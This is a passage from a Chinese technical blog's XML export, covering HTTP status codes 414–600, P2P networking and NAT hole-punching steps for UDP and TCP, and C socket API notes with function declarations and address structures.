的响应头，以告知客户端可以在多少时间以后重新尝试。</p><h3 id="414-Request-URI-Too-Long"><a href="#414-Request-URI-Too-Long" class="headerlink" title="414 Request-URI Too Long"></a>414 Request-URI Too Long</h3><p>请求的URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。这比较少见，通常的情况包括：</p><p>本应使用POST方法的表单提交变成了GET方法，导致查询字符串（Query String）过长。</p><p>重定向URI “黑洞”，例如每次重定向把旧的 URI 作为新的 URI 的一部分，导致在若干次重定向后 URI 超长。</p><p>客户端正在尝试利用某些服务器中存在的安全漏洞攻击服务器。这类服务器使用固定长度的缓冲读取或操作请求的 URI，当 GET 后的参数超过某个数值后，可能会产生缓冲区溢出，导致任意代码被执行[1]。没有此类漏洞的服务器，应当返回414状态码。</p><h3 id="415-Unsupported-Media-Type"><a href="#415-Unsupported-Media-Type" class="headerlink" title="415 Unsupported Media Type"></a>415 Unsupported Media Type</h3><p>对于当前请求的方法和所请求的资源，请求中提交的实体并不是服务器中所支持的格式，因此请求被拒绝。</p><h3 id="416-Requested-Range-Not-Satisfiable"><a href="#416-Requested-Range-Not-Satisfiable" class="headerlink" title="416 Requested Range Not Satisfiable"></a>416 Requested Range Not Satisfiable</h3><p>如果请求中包含了 Range 请求头，并且 Range 中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 If-Range 请求头，那么服务器就应当返回416状态码。</p><p>假如 Range 使用的是字节范围，那么这种情况就是指请求指定的所有数据范围的首字节位置都超过了当前资源的长度。服务器也应当在返回416状态码的同时，包含一个 Content-Range 实体头，用以指明当前资源的长度。这个响应也被禁止使用 multipart/byteranges 作为其 Content-Type。</p><h3 id="417-Expectation-Failed"><a href="#417-Expectation-Failed" class="headerlink" title="417 Expectation Failed"></a>417 Expectation Failed</h3><p>在请求头 Expect 中指定的预期内容无法被服务器满足，或者这个服务器是一个代理服务器，它有明显的证据证明在当前路由的下一个节点上，Expect 的内容无法被满足。</p><h3 id="418-I’m-a-teapot"><a href="#418-I’m-a-teapot" class="headerlink" title="418 I’m a teapot"></a>418 I’m a teapot</h3><h3 id="421-too-many-connections"><a href="#421-too-many-connections" class="headerlink" title="421 too many connections"></a>421 too many connections</h3><p>There are too many connections from your internet address</p><p>从当前客户端所在的IP地址到服务器的连接数超过了服务器许可的最大范围。通常，这里的IP地址指的是从服务器上看到的客户端地址（比如用户的网关或者代理服务器地址）。在这种情况下，连接数的计算可能涉及到不止一个终端用户。</p><h3 id="422-Unprocessable-Entity"><a href="#422-Unprocessable-Entity" class="headerlink" title="422 Unprocessable Entity"></a>422 Unprocessable Entity</h3><p>请求格式正确，但是由于含有语义错误，无法响应。（RFC 4918 WebDAV）</p><h3 id="423-Locked"><a href="#423-Locked" class="headerlink" title="423 Locked"></a>423 Locked</h3><p>当前资源被锁定。（RFC 4918 WebDAV）</p><h3 id="424-Failed-Dependency"><a href="#424-Failed-Dependency" class="headerlink" title="424 Failed Dependency"></a>424 Failed Dependency</h3><p>由于之前的某个请求发生的错误，导致当前请求失败，例如 PROPPATCH。（RFC 4918 WebDAV）</p><h3 id="425-Unordered-Collection"><a href="#425-Unordered-Collection" class="headerlink" title="425 Unordered Collection"></a>425 Unordered Collection</h3><p>在WebDav Advanced Collections 草案中定义，但是未出现在《WebDAV 顺序集协议》（RFC 3658）中。</p><h3 id="426-Upgrade-Required"><a href="#426-Upgrade-Required" class="headerlink" title="426 Upgrade Required"></a>426 Upgrade Required</h3><p>客户端应当切换到TLS/1.0。（RFC 2817）</p><h3 id="449-Retry-With"><a href="#449-Retry-With" class="headerlink" title="449 Retry With"></a>449 Retry With</h3><p>由微软扩展，代表请求应当在执行完适当的操作后进行重试。</p><h3 id="451-Unavailable-For-Legal-Reasons"><a href="#451-Unavailable-For-Legal-Reasons" class="headerlink" title="451 Unavailable For Legal Reasons"></a>451 Unavailable For Legal Reasons</h3><p>该请求因法律原因不可用。（RFC 7725）</p><h2 id="5xx、6xx-服务器错误"><a href="#5xx、6xx-服务器错误" class="headerlink" title="5xx、6xx 服务器错误"></a>5xx、6xx 服务器错误</h2><p>这类状态码代表了服务器在处理请求的过程中有错误或者异常状态发生，也有可能是服务器意识到以当前的软硬件资源无法完成对请求的处理。除非这是一个HEAD 请求，否则服务器应当包含一个解释当前错误状态以及这个状况是临时的还是永久的解释信息实体。浏览器应当向用户展示任何在当前响应中被包含的实体。</p><p>这些状态码适用于任何响应方法。</p><h3 id="500-Internal-Server-Error"><a href="#500-Internal-Server-Error" class="headerlink" title="500 Internal Server Error"></a>500 Internal Server Error</h3><p>服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。一般来说，这个问题都会在服务器端的源代码出现错误时出现。</p><h3 id="501-Not-Implemented"><a href="#501-Not-Implemented" class="headerlink" title="501 Not Implemented"></a>501 Not Implemented</h3><p>服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。</p><h3 id="502-Bad-Gateway"><a href="#502-Bad-Gateway" class="headerlink" title="502 Bad Gateway"></a>502 Bad Gateway</h3><p>作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。</p><h3 id="503-Service-Unavailable"><a href="#503-Service-Unavailable" class="headerlink" title="503 Service Unavailable"></a>503 Service Unavailable</h3><p>由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是临时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个 Retry-After 头用以标明这个延迟时间。如果没有给出这个 Retry-After 信息，那么客户端应当以处理500响应的方式处理它。</p><p>注意：503状态码的存在并不意味着服务器在过载的时候必须使用它。某些服务器只不过是希望拒绝客户端的连接。</p><h3 id="504-Gateway-Timeout"><a href="#504-Gateway-Timeout" class="headerlink" title="504 Gateway Timeout"></a>504 Gateway Timeout</h3><p>作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应。<br>注意：某些代理服务器在DNS查询超时时会返回400或者500错误</p><h3 id="505-HTTP-Version-Not-Supported"><a href="#505-HTTP-Version-Not-Supported" class="headerlink" title="505 HTTP Version Not Supported"></a>505 HTTP Version Not Supported</h3><p>服务器不支持，或者拒绝支持在请求中使用的 HTTP 版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。</p><h3 id="506-Variant-Also-Negotiates"><a href="#506-Variant-Also-Negotiates" class="headerlink" title="506 Variant Also Negotiates"></a>506 Variant Also Negotiates</h3><p>由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误：被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。</p><h3 id="507-Insufficient-Storage"><a href="#507-Insufficient-Storage" class="headerlink" title="507 Insufficient Storage"></a>507 Insufficient Storage</h3><p>服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。WebDAV (RFC 4918)</p><h3 id="509-Bandwidth-Limit-Exceeded"><a href="#509-Bandwidth-Limit-Exceeded" class="headerlink" title="509 Bandwidth Limit Exceeded"></a>509 Bandwidth Limit Exceeded</h3><p>服务器达到带宽限制。这不是一个官方的状态码，但是仍被广泛使用。</p><h3 id="510-Not-Extended"><a href="#510-Not-Extended" class="headerlink" title="510 Not Extended"></a>510 Not Extended</h3><p>获取资源所需要的策略并没有被满足。（RFC 2774）</p><h3 id="600-Unparseable-Response-Headers"><a href="#600-Unparseable-Response-Headers" class="headerlink" title="600 Unparseable Response Headers"></a>600 Unparseable Response Headers</h3><p>源站没有返回响应头部，只返回实体内容。</p><h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h2><ul><li>url在请求时，除了规定的格式中的符号，参数中的符号必须要转码</li><li>例如get请求中的参数如果有特殊字符，需要使用一个在线转码工具转码才能上传，不然服务端解析会失败</li></ul><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><ul><li>大的逻辑改动一定要备份</li><li>环境初始状态要备份</li></ul>]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>p2p打洞技术研究</title>
    <url>/2019/03/23/2019-03-23-p2pHoles/</url>
    <content><![CDATA[<h1 id="p2p技术简介"><a href="#p2p技术简介" class="headerlink" title="p2p技术简介"></a>p2p技术简介</h1><p>对等式网络（peer-to-peer，简称P2P），又称点对点技术，是无中心服务器、依靠用户群（peers）交换信息的互联网体系。它的作用在于，网络的参与者共享他们所拥有的一部分硬件资源（处理能力、存储能力、网络连接能力、打印机等），这些共享资源通过网络提供服务和内容，能被其它对等节点(Peer)直接访问而无需经过中间实体，减低以往网路传输中的节点，以降低资料遗失的风险。与有中心服务器的中央网络系统不同，对等网络中的每个用户端既是资源（服务和内容）提供者（Server），又是资源获取者（Client），任何一个节点无法直接找到其他节点，必须依靠其用户群进行信息交流。</p><h1 id="p2p网络拓扑图（讲一些废话）"><a href="#p2p网络拓扑图（讲一些废话）" class="headerlink" title="p2p网络拓扑图（讲一些废话）"></a>p2p网络拓扑图（讲一些废话）</h1><img src="/2019/03/23/2019-03-23-p2pHoles/2019_03_23_01.png" width="50%"><p>如图，我们可以总结出P2P网络的一些特征：</p><ul><li><strong>非中心化：</strong> P2P是全分布式系统，网络中的资源和服务分散在所有的节点上，信息的传输和服务的实现都直接在节点之间进行，可以无需中间环节和服务器介入。<br>可扩展性：用户可以随时加入该网络，系统的资源和服务能力随之同步扩充。理论上其可扩展性几乎可以认为是无限的。</li><li><strong>健壮性：</strong> 因为服务是分散在各个节点之间的，部分节点或网络遭到破坏对其他部分的影响很小，故P2P具有耐攻击、高容错的特点。P2P网络一般在部分结点失效时能够自动调整整体拓扑，保持其它结点的连通性。P2P网络通常都是以自组织的方式建立起来的，并允许结点自由地加入和离开。</li><li><strong>高性价比：</strong> P2P架构可以有效地利用互联网中散布的大量普通结点，将计算任务或存储资料分布到所有结点上。利用其中闲置的计算能力或存储空间，达到高性能计算和海量存储的目的。</li><li><strong>隐私保护：</strong> 在P2P网络中，由于信息的传输分散在各节点之间进行而无需经过某个集中环节，用户的隐私信息被窃听和泄漏的可能性大大缩小。</li><li><strong>负载均衡：</strong> 由于每个节点既是服务器又是客户端，减少了传统C/S模型中对服务器计算能力、存储的要求，同时因为资源分布在多个节点，更好的实现了整个网络的负载均衡。</li></ul><h1 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h1><h2 id="分包发送"><a href="#分包发送" class="headerlink" title="分包发送"></a>分包发送</h2><p>由于p2p是点到点的连接，文件从多个的节点上获取，就需要将文件进行分块处理。这一部分主要是文件的分包、排序、校验和合并的过程，不是很难的技术。</p><h2 id="文件下载技术"><a href="#文件下载技术" class="headerlink" title="文件下载技术"></a>文件下载技术</h2><h3 id="种子文件信息"><a href="#种子文件信息" class="headerlink" title="种子文件信息"></a>种子文件信息</h3><p>拿bittorrent距离，种子文件储存的信息有</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- info：存储资源文件的元信息</span><br><span class="line">    - piece length</span><br><span class="line">    - pieces</span><br><span class="line">    - name&#x2F;path</span><br><span class="line">- announce：描述tracker服务器的URL</span><br></pre></td></tr></table></figure><ul><li><p>info：info键对应的值又是一个字典结构，BT协议将一个文件分成若干块，便于客户端从各个主机下载各个块。其中的piece length键值对表示一个块的长度，通畅情况下是2的n次方，根据文件大小有所权衡，通长越大的文件piece length越大以减少piece的数量，降低piece数量一方面降低了种子文件保存块信息数目的大小，一方面也减少了下载时需要对块做的确认操作，加快下载速度。目前块的大小通常是256KB，512KB或者1MB。</p></li><li><p>pieces：表示每个块的正确性验证信息，每一块均对应一个唯一的SHA1散列值。该键对应的值是所有块的SHA1散列值（每个块所对应的散列值大小为20字节）连接而成的字符串。</p></li><li><p>name/path：表示具体文件的信息。因为BitTorrent协议允许将数个文件和文件夹作为一个BT下载进行发布，因此下载方可以根据需要勾选某一些下载文件。注意，这里将数个文件也砍成一个数据流，因此一个piece如果在文件边界上，可能包含不同文件的信息。</p></li><li><p>announce：保存的是tracker服务器的URL，在一些扩展协议中，announce可以保存多个tracker服务器作为备选。</p></li></ul><h3 id="tracker服务器"><a href="#tracker服务器" class="headerlink" title="tracker服务器"></a>tracker服务器</h3><p>一般p2p连接下载文件需要有一个公网下的tracker服务器帮助获得各个节点的信息，服务器上面保存了各个文件的节点列表。节点列表中的各个节点可以随时加入和退出，列表中一般储存的是</p><ul><li>文件的编码值</li><li>节点名称</li><li>ip</li><li>port</li></ul><p>当一个节点想要下载某个文件，向tracker服务器上请求节点列表，然后连接各个节点进行下载传输。</p><h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>到这里是大多数网上讲解p2p的内容，但有一个关键的技术没有说明，就是内网穿透。</p><img src="/2019/03/23/2019-03-23-p2pHoles/2019_03_23_02.png" width="60%"><p>节点通常是各个用户的电脑，所处环境一般为局域网内。总所周知局域网的路由器维护一个nat列表，会将不请自来的消息过滤掉，也保证了网络的安全性。但对于p2p来说就比较麻烦，无法让两个局域网内的节点相互建立连接进行文件传输。这里讲两个重要的内网穿透技术：UDP打洞和TCP打洞</p><p>打洞之前需要了解一下路由器的nat类型，部分nat类型不支持打洞。</p><h3 id="NAT类型"><a href="#NAT类型" class="headerlink" title="NAT类型"></a>NAT类型</h3><ol><li><strong>全克隆(Full Cone):</strong> NAT把所有来自相同内部IP地址和端口的请求映射到相同的外部IP地址和端口。任何一个外部主机均可通过该映射发送IP包到该内部主机。</li><li><strong>限制性克隆(Restricted Cone):</strong> NAT把所有来自相同内部IP地址和端口的请求映射到相同的外部IP地址和端口。但是，只有当内部主机先给IP地址为X的外部主机发送IP包，该外部主机才能向该内部主机发送IP包。</li><li><strong>端口限制性克隆(Port Restricted Cone):</strong> 端口限制性克隆与限制性克隆类似，只是多了端口号的限制，即只有内部主机先向IP地址为X，端口号为P的外部主机发送1个IP包，该外部主机才能够把源端口号为P的IP包发送给该内部主机。</li><li><strong>对称式NAT(Symmetric NAT):</strong> 这种类型的NAT与上述3种类型的不同，在于当同一内部主机使用相同的端口与不同地址的外部主机进行通信时， NAT对该内部主机的映射会有所不同。对称式NAT不保证所有会话中的私有地址和公开IP之间绑定的一致性。相反，它为每个新的会话分配一个新的端口号。</li></ol><ul><li>第一种最为理想，基本就是无需打洞；</li><li>第四种最糟糕，根本就不能打洞。好消息就是这种nat基本没有，很少。</li><li>所以关键是第二和第三种nat类型。</li></ul><h3 id="UDP打洞"><a href="#UDP打洞" class="headerlink" title="UDP打洞"></a>UDP打洞</h3><p>先讲UDP打洞主要是因为UDP打洞要比TCP打洞方便的多，而且UDP传输的速度也要比TCP快很多。</p><p>UDP打洞主要是建立两边路由器NAT的规则，分为以下几步进行：</p><ol><li>两个节点A、B都向公网内的tracker服务器C发送数据，两边的NAT-A和NAT-B就有了一条规则$A \Leftrightarrow C$和$B \Leftrightarrow C$，允许A和B接收来自C的数据。</li><li>服务器C获得了A和B在公网映射的ip和端口，交叉发送给对方。</li><li><strong>关键点</strong> A向B在公网映射的ip和端口发送一条数据，会被NAT-B拦截过滤掉，因为没有这条NAT规则。<strong>但是</strong>NAT-A中多了一条规则$A \Leftrightarrow B$。</li><li>这时候B向A发送一条数据就可以畅通无阻地通过NAT-A到达A。<strong>这时</strong>NAT-B也有了一条规则$B \Leftrightarrow A$。到这里A和B就可以进行UDP通信了。</li></ol><p>这一步已经通过两台电脑加上两个虚拟机验证过了，方案可行。</p><h3 id="TCP打洞"><a href="#TCP打洞" class="headerlink" title="TCP打洞"></a>TCP打洞</h3><p>TCP打洞和UDP打洞的原理类似，但是由于</p><ul><li>TCP连接需要三次握手</li><li>TCP client占用一个端口只能连接一个服务器</li><li>TCP server可以连接多个TCP client</li></ul><p>这里就有些麻烦，分为以下几步进行：</p><ol><li>两个节点A、B都和公网内的tracker服务器C的<strong>主连接端口</strong>进行TCP连接，服务器C获得了A和B在公网映射的ip和端口，<strong>这个连接不会断掉</strong>，通过这个连接也可以维护节点列表。</li><li>A使用另外的端口（打洞端口）连接服务器C的<strong>协助打洞端口</strong>，服务器获取到A打洞的ip加端口，<strong>同时在该端口号上启动侦听（如果是NAT类型1可能直接就连接成功）</strong>。注意由于要在相同的网络终端上绑定到不同的套接字上，所以必须为这些套接字设置<code>SO_REUSEADDR</code>属性（即允许重用），否则侦听会失败。</li><li>B也连接服务器C的<strong>协助打洞端口</strong>，但连接后立刻断开，并启用监听。这时候C获取到B的公网ip和端口。</li><li>C通过<strong>主连接端口</strong>告诉B：A打洞的公网ip和端口。</li><li>B向A发起TCP连接请求（如果为NAT类型1，这一步就已经可以建立连接），被NAT-A过滤掉，但是NAT-B添加规则$B \Leftrightarrow A$</li><li>B通过<strong>主连接端口</strong>告诉C：我已经准备好了。</li><li>C通过<strong>主连接端口</strong>告诉A：B打洞的公网ip和端口。</li><li>A向B发起TCP连接，到此连接成功，NAT-A也添加规则$A \Leftrightarrow B$。</li></ol><p>这一步由于需要进行网络编程进行验证，代码没来得及写完，没来得及验证。</p>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>网络编程笔记（C语言）</title>
    <url>/2019/03/22/2019-03-22-networkProgramC/</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>操作系统: Linux</li><li>编译器: make</li></ul><h1 id="套接字"><a href="#套接字" class="headerlink" title="套接字"></a>套接字</h1><ul><li>TCP用主机的IP地址加上主机上的端口号作为TCP连接的端点，这种端点就叫做套接字（socket）或插口。</li><li>套接字用（IP地址：端口号）表示。</li><li>它是网络通信过程中端点的抽象表示，包含进行网络通信必需的五种信息：<ul><li>连接使用的协议</li><li>本地主机的IP地址</li><li>本地进程的协议端口</li><li>远地主机的IP地址</li><li>远地进程的协议端口。</li></ul></li></ul><h2 id="创建一个套接字"><a href="#创建一个套接字" class="headerlink" title="创建一个套接字"></a>创建一个套接字</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 创建一个套接字</span></span><br><span class="line"><span class="comment"> * @param __domain 指明使用的协议族</span></span><br><span class="line"><span class="comment"> * @param __type 指明socket类型</span></span><br><span class="line"><span class="comment"> * @param __protocol 协议类型</span></span><br><span class="line"><span class="comment"> * @return -1，出错；其他，描述符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span> <span class="params">(<span class="keyword">int</span> __domain, <span class="keyword">int</span> __type, <span class="keyword">int</span> __protocol)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="参数取值"><a href="#参数取值" class="headerlink" title="参数取值"></a>参数取值</h3><p>__domain 指明使用的协议族</p><ul><li>AF_INET:Address Family，指定TCP/IP协议家族</li><li>PF_INET:Protocol Family<ul><li>在windows中 AF_INET和PF_INET完全一样</li><li>在某些Linux中两者会有差距（但一般也相同），理论上建立socket时是指定协议，应该用PF_XXX,设置地址时用AF_XXX，不过在两者相等的情况下混用也没啥。</li></ul></li><li>AF_UNIX：用于同一台计算机的进程间通信</li><li>AF_INET6:ipv6网络协议</li></ul><p>__type 指明socket类型</p><ul><li>SOCK_STREAM:流套接字，对应TCP协议</li><li>SOCK_DGRAM:数据报套接字，对应UDP协议</li><li>SOCK_RAW:原始套接字，提供原始网络协议存取</li><li>SOCK_PACKET:直接从网络驱动获取数据，即从数据链路层开始处理（过时了）<ul><li>如果想获取数据链路层，可用<code>socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP|ETH_P_ARP|ETH_P_ALL))</code></li></ul></li></ul><p>__protocol 协议类型</p><ul><li>传输层：IPPROTO_TCP、IPPROTO_UDP、IPPROTO_ICMP</li><li>网络层：htons(ETH_P_IP|ETH_P_ARP|ETH_P_ALL)</li></ul><p><strong>三者参数并不完全独立，比如type选用sock_stream,protocol就得是IPPRPTP_TCP</strong></p><h2 id="绑定本地端口"><a href="#绑定本地端口" class="headerlink" title="绑定本地端口"></a>绑定本地端口</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 将套接字绑定本地端口</span></span><br><span class="line"><span class="comment"> * @param __fd 套接字描述符</span></span><br><span class="line"><span class="comment"> * @param __addr 指向要绑定给sockfd的协议地址</span></span><br><span class="line"><span class="comment"> * @param __len 地址的长度</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于errno</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span> <span class="params">(<span class="keyword">int</span> __fd, __CONST_SOCKADDR_ARG __addr, <span class="keyword">socklen_t</span> __len)</span></span></span><br></pre></td></tr></table></figure><h3 id="参数取值-1"><a href="#参数取值-1" class="headerlink" title="参数取值"></a>参数取值</h3><p>__addr 指向要绑定给sockfd的协议地址</p><p><strong>赋值时需要转换为<a href="#networkByte">网络字节序</a></strong><br><strong>网络地址的转换可以使用<a href="#networkAddress">工具函数</a></strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __CONST_SOCKADDR_ARG	const struct sockaddr *</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ipv4取值</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">sa_family_t</span>    sin_family; <span class="comment">/* address family: AF_INET */</span></span><br><span class="line">    <span class="keyword">in_port_t</span>      sin_port;   <span class="comment">/* port in network byte order */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>   <span class="comment">/* internet address */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Internet address. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span>       s_addr;     <span class="comment">/* address in network byte order */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ipv6取值</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> &#123;</span></span><br><span class="line">    <span class="keyword">sa_family_t</span>     sin6_family;   <span class="comment">/* AF_INET6 */</span></span><br><span class="line">    <span class="keyword">in_port_t</span>       sin6_port;     <span class="comment">/* port number */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>        sin6_flowinfo; <span class="comment">/* IPv6 flow information */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> <span class="title">sin6_addr</span>;</span>     <span class="comment">/* IPv6 address */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>        sin6_scope_id; <span class="comment">/* Scope ID (new in 2.4) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   s6_addr[<span class="number">16</span>];   <span class="comment">/* IPv6 address */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Unix取值</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNIX_PATH_MAX    108</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> &#123;</span></span><br><span class="line">    <span class="keyword">sa_family_t</span> sun_family;               <span class="comment">/* AF_UNIX */</span></span><br><span class="line">    <span class="keyword">char</span>        sun_path[UNIX_PATH_MAX];  <span class="comment">/* pathname */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="TCP连接"><a href="#TCP连接" class="headerlink" title="TCP连接"></a>TCP连接</h2><h3 id="TCP服务器"><a href="#TCP服务器" class="headerlink" title="TCP服务器"></a>TCP服务器</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 开始监听</span></span><br><span class="line"><span class="comment"> * @param __fd 套接字描述符</span></span><br><span class="line"><span class="comment"> * @param __n 等待连接的队列长度</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于errno</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span> <span class="params">(<span class="keyword">int</span> __fd, <span class="keyword">int</span> __n)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 阻塞式接受第一个连接</span></span><br><span class="line"><span class="comment"> * @param __fd 套接字描述符</span></span><br><span class="line"><span class="comment"> * @param __addr 连接地址指针</span></span><br><span class="line"><span class="comment"> * @param __addr_len 地址长度指针</span></span><br><span class="line"><span class="comment"> * @return 连接套接字描述符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span> <span class="params">(<span class="keyword">int</span> __fd, __SOCKADDR_ARG __addr, <span class="keyword">socklen_t</span> *__restrict __addr_len)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="TCP客户端"><a href="#TCP客户端" class="headerlink" title="TCP客户端"></a>TCP客户端</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 开始监听</span></span><br><span class="line"><span class="comment"> * @param __fd 套接字描述符</span></span><br><span class="line"><span class="comment"> * @param __n 等待连接的队列长度</span></span><br><span class="line"><span class="comment"> * @return 0，成功；-1，错误，原因存于errno</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><h4 id="TCP连接后，一方断电，另一方是无法检测到对方断电的"><a href="#TCP连接后，一方断电，另一方是无法检测到对方断电的" class="headerlink" title="TCP连接后，一方断电，另一方是无法检测到对方断电的"></a>TCP连接后，一方断电，另一方是无法检测到对方断电的</h4><ul><li>TCP连接并没有检测机制，所以一方断电，另一方无法检测到。</li><li>强行退出程序，操作系统会回收资源，内部执行关闭套接字，所以客户端可以检测到断开连接。</li></ul><h4 id="SO-KEEPALIVE-保活"><a href="#SO-KEEPALIVE-保活" class="headerlink" title="SO_KEEPALIVE 保活"></a>SO_KEEPALIVE 保活</h4><p>TCP连接选项中有一项是心跳保活机制，但并不是规范的一部分，官方RFC罗列不适用的三个理由:</p><ol><li>在短暂的故障期间，可能使一个良好的连接被释放</li><li>占用了不必要的贷款</li><li>在以数据包计费的网络上话费额外的金钱</li></ol><h1 id="网络编程工具函数"><a href="#网络编程工具函数" class="headerlink" title="网络编程工具函数"></a>网络编程工具函数</h1><h2 id="网络字节序转换"><a href="#网络字节序转换" class="headerlink" title="网络字节序转换"></a><span id="networkByte">网络字节序转换</span></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> ntohl (<span class="keyword">uint32_t</span> __netlong);</span><br><span class="line"><span class="keyword">uint16_t</span> ntohs (<span class="keyword">uint16_t</span> __netshort);</span><br><span class="line"><span class="keyword">uint32_t</span> htonl (<span class="keyword">uint32_t</span> __hostlong);</span><br><span class="line"><span class="keyword">uint16_t</span> htons (<span class="keyword">uint16_t</span> __hostshort);</span><br></pre></td></tr></table></figure><h2 id="网络地址转换-in-addr-t和char"><a href="#网络地址转换-in-addr-t和char" class="headerlink" title="网络地址转换 in_addr_t和char *"></a><span id="networkAddress">网络地址转换 in_addr_t和char *</span></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 将数字-点方式(192.168.1.1)的ip字符串转成in_addr_t格式</span></span><br><span class="line"><span class="comment"> * @param __cp 字符串</span></span><br><span class="line"><span class="comment"> * @return in_addr_t类型地址</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">in_addr_t</span> inet_addr (<span class="keyword">const</span> <span class="keyword">char</span> *__cp);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @description 将struct in_addr格式的ip地址转成数字-点方式(192.168.1.1)</span></span><br><span class="line"><span class="comment"> * @param __in ip结构体</span></span><br><span class="line"><span class="comment"> * @return 数字-点方式ip字符串</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span 